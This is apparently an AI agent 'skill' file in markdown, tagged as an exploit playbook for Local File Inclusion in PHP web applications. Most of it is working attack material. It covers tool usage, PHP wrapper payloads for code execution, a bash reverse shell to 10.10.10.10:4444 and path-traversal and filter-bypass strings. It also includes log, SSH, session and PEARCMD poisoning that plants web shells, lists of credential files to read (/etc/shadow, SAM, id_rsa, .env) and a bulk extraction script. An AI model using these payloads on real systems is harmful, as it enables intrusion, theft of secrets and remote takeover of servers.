---
name: lfi-poc
category: exploit
tags:
  - lfi
  - local-file-inclusion
  - path-traversal
  - file-read
  - rce
  - php-wrappers
triggers:
  - local file inclusion
  - lfi vulnerability
  - path traversal
  - file inclusion
  - php wrapper
  - lfi to rce
os: cross-platform
---

# LFI-POC

## Purpose

Exploit Local File Inclusion (LFI) vulnerabilities to read sensitive files, execute code, and escalate to Remote Code Execution (RCE). LFI occurs when web applications include files based on user-controlled input without proper sanitization.

## Tools

### LFImap

- **Description**: Modern LFI discovery and exploitation tool
- **Language**: Python 3
- **Install**: `pip install lfimap`
- **GitHub**: https://github.com/hansmach1ne/LFImap

### LFISuite

- **Description**: Automatic LFI scanner and exploiter with reverse shell
- **Version**: 1.13
- **Language**: Python 2.7
- **GitHub**: https://github.com/D35m0nd142/LFISuite

## Installation

### LFImap Installation

```bash
# Install via pip
pip install lfimap

# Install from source
git clone https://github.com/hansmach1ne/LFImap.git
cd LFImap
pip install -r requirements.txt
python3 lfimap.py -h
```

### LFISuite Installation

```bash
# Clone repository
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite

# Install dependencies (Python 2.7)
pip2 install termcolor requests

# Run
python2 lfisuite.py
```

## CLI Reference

### LFImap Options

```
Target Options:
  -U [url]              Single URL to test
  -F [urlfile]          Load URLs from file
  -R [reqfile]          Load raw HTTP request from file

Request Options:
  -C <cookie>           HTTP Cookie header
  -D <data>             POST form data
  -H <header>           Additional HTTP headers
  -M <method>           HTTP method (GET/POST)
  -P <proxy>            Proxy (http://host:port)
  --useragent <agent>   Custom User-Agent
  --delay <ms>          Delay between requests
  --max-timeout <sec>   Response timeout (default 5)

Attack Techniques:
  -f, --filter          PHP filter wrapper attack
  -i, --input           PHP input wrapper attack
  -d, --data            PHP data wrapper attack
  -e, --expect          PHP expect wrapper attack
  -t, --trunc           Path traversal with wordlist
  -r, --rfi             Remote file inclusion
  -c, --cmd             Command injection
  -file, --file         File wrapper attack
  -heur, --heuristics   Test for misc issues
  -a, --all             Use all attack methods

Payload Options:
  -n <U|B>              Encoding (U=URL, B=Base64)
  -q, --quick           Quick mode (fewer payloads)
  -x, --exploit         Exploit for reverse shell
  --lhost <ip>          Local IP for reverse shell
  --lport <port>        Local port for reverse shell
  --callback <host>     OOB callback hostname

Wordlist Options:
  -wT <path>            Custom traversal wordlist
  --use-long            Use long wordlist

Output:
  --log <file>          Log requests/responses
  -v, --verbose         Verbose output
```

## Basic Workflows

### LFImap Basic Scanning

```bash
# Scan single URL with all attacks
python3 lfimap.py -U "http://target.com/page.php?file=test" -a

# Scan with cookie authentication
python3 lfimap.py -U "http://target.com/page.php?file=test" -C "PHPSESSID=abc123" -a

# POST parameter testing
python3 lfimap.py -U "http://target.com/index.php" -D "page=test" -a

# Quick mode with verbose output
python3 lfimap.py -U "http://target.com/page.php?file=test" -a -q -v
```

### LFImap Exploitation

```bash
# Exploit for reverse shell
python3 lfimap.py -U "http://target.com/page.php?file=test" -a -x --lhost 10.10.10.10 --lport 4444

# OOB detection with callback
python3 lfimap.py -U "http://target.com/page.php?file=test" -a -v --callback="attacker.oastify.com"

# Scan multiple URLs from file
python3 lfimap.py -F urls.txt -a -q
```

### LFISuite Usage

```bash
# Start interactive mode
python2 lfisuite.py

# Menu options:
# 1. Exploiter (use known LFI to exploit)
# 2. Scanner (find LFI vulnerabilities)

# Attack modes available:
# 1. /proc/self/environ
# 2. php://filter
# 3. php://input
# 4. /proc/self/fd
# 5. access log
# 6. phpinfo
# 7. data://
# 8. expect://
# 9. Auto-Hack (try all)
```

## PHP Wrapper Attacks

### php://filter (File Read)

```bash
# Base64 encode file contents
http://target.com/page.php?file=php://filter/convert.base64-encode/resource=config.php

# Read with rot13
http://target.com/page.php?file=php://filter/read=string.rot13/resource=config.php

# Chain multiple filters
http://target.com/page.php?file=php://filter/convert.base64-encode|convert.base64-decode/resource=config.php

# Decode base64 output
echo "PD9waHAK..." | base64 -d
```

### php://input (RCE)

```bash
# Execute PHP code via POST body
curl -X POST "http://target.com/page.php?file=php://input" \
  -d "<?php system('id'); ?>"

# Reverse shell via php://input
curl -X POST "http://target.com/page.php?file=php://input" \
  -d "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.10.10/4444 0>&1\"'); ?>"
```

### data:// Wrapper (RCE)

```bash
# Execute base64 encoded PHP
http://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Plain text PHP execution
http://target.com/page.php?file=data://text/plain,<?php system('id'); ?>

# URL encoded payload
http://target.com/page.php?file=data://text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
```

### expect:// Wrapper (RCE)

```bash
# Direct command execution (requires expect extension)
http://target.com/page.php?file=expect://id
http://target.com/page.php?file=expect://whoami
http://target.com/page.php?file=expect://ls+-la
```

## Path Traversal Techniques

### Basic Traversal

```bash
# Standard traversal
../../../etc/passwd
....//....//....//etc/passwd
..\/..\/..\/etc/passwd

# URL encoded
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd

# Double URL encoded
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# UTF-8 encoded
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

### Null Byte Bypass (PHP < 5.3.4)

```bash
# Terminate string to bypass extension checks
http://target.com/page.php?file=../../../etc/passwd%00
http://target.com/page.php?file=../../../etc/passwd%00.php
```

### Path Truncation

```bash
# Exceed max path length (4096 bytes)
http://target.com/page.php?file=../../../etc/passwd/./././././[...repeat...]
http://target.com/page.php?file=../../../etc/passwd............[...repeat...]
```

### Filter Bypass Techniques

```bash
# Double dot bypass
....//....//etc/passwd
..///////..////..//////etc/passwd

# Backslash variants
..%5c..%5c..%5cetc/passwd
/%5C../%5C../%5C../etc/passwd

# Mixed encoding
..%252f..%252f..%252fetc/passwd
```

## LFI to RCE Methods

### Log Poisoning

```bash
# Poison Apache access log via User-Agent
curl http://target.com/ -A "<?php system(\$_GET['cmd']); ?>"

# Include poisoned log
http://target.com/page.php?file=/var/log/apache2/access.log&cmd=id

# Common log paths:
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log
/var/log/nginx/access.log
/var/log/apache2/error.log
```

### SSH Log Poisoning

```bash
# SSH with PHP payload as username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Include SSH auth log
http://target.com/page.php?file=/var/log/auth.log&cmd=id
```

### /proc/self/environ

```bash
# Inject via User-Agent header
curl "http://target.com/page.php?file=/proc/self/environ" \
  -H "User-Agent: <?php system('id'); ?>"
```

### PHP Session Poisoning

```bash
# Session files location
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]

# Inject payload into session variable
# Then include session file
http://target.com/page.php?file=/var/lib/php/sessions/sess_abc123
```

### PEARCMD Exploitation

```bash
# Method 1: config create
/page.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=system($_GET['c'])?>+/tmp/shell.php
/page.php?file=/tmp/shell.php&c=id

# Method 2: man_dir
/page.php?file=/usr/local/lib/php/pearcmd.php&+-c+/tmp/shell.php+-d+man_dir=<?system($_GET['c']);?>+-s+
/page.php?file=/tmp/shell.php&c=id
```

## Sensitive File Paths

### Linux Files

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/group
/etc/motd
/etc/mysql/my.cnf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/etc/nginx/sites-enabled/default
/etc/crontab
/etc/ssh/sshd_config
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/version
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/home/[user]/.ssh/id_rsa
/home/[user]/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

### Windows Files

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\win.ini
C:\Windows\php.ini
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\php\php.ini
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\Users\[user]\.ssh\id_rsa
```

### Application Files

```
# Web config files
.htaccess
wp-config.php
config.php
configuration.php
database.php
settings.php
.env
config/database.yml
```

## Automation Scripts

### Batch File Extraction

```bash
#!/bin/bash
# lfi_extract.sh - Extract multiple files via LFI

TARGET="http://target.com/page.php?file="
FILES=(
  "/etc/passwd"
  "/etc/hosts"
  "/etc/apache2/apache2.conf"
  "/var/log/apache2/access.log"
)

for file in "${FILES[@]}"; do
  echo "[*] Extracting: $file"
  curl -s "${TARGET}php://filter/convert.base64-encode/resource=${file}" | \
    grep -oP '[A-Za-z0-9+/=]{20,}' | base64 -d 2>/dev/null
  echo "---"
done
```

### LFI Wordlist Fuzzing

```bash
# Using ffuf with LFI wordlist
ffuf -u "http://target.com/page.php?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 -fs 0

# Using wfuzz
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  --hc 404 --hl 0 \
  "http://target.com/page.php?file=FUZZ"
```

## Troubleshooting

### Common Issues

| Issue              | Solution                               |
| ------------------ | -------------------------------------- |
| No output          | Try different traversal depths         |
| Blocked characters | Use encoding (URL, double-URL, UTF-8)  |
| Extension appended | Try null byte (%00) or path truncation |
| WAF blocking       | Use filter wrappers or encoding chains |
| php:// blocked     | Try data:// or expect:// wrappers      |

### Verify Vulnerability

```bash
# Test basic traversal
http://target.com/page.php?file=../../../etc/passwd

# Test with encoding
http://target.com/page.php?file=....//....//....//etc/passwd

# Test wrapper availability
http://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php
```

## Security Considerations

- LFI can lead to full system compromise via RCE
- Extracted files may contain credentials
- Log poisoning modifies server logs
- Session poisoning affects other users
- Always verify scope before exploitation
- Document all accessed/modified files

## References

- LFImap: https://github.com/hansmach1ne/LFImap
- LFISuite: https://github.com/D35m0nd142/LFISuite
- PayloadsAllTheThings LFI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- HackTricks LFI: https://book.hacktricks.xyz/pentesting-web/file-inclusion
- OWASP File Inclusion: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
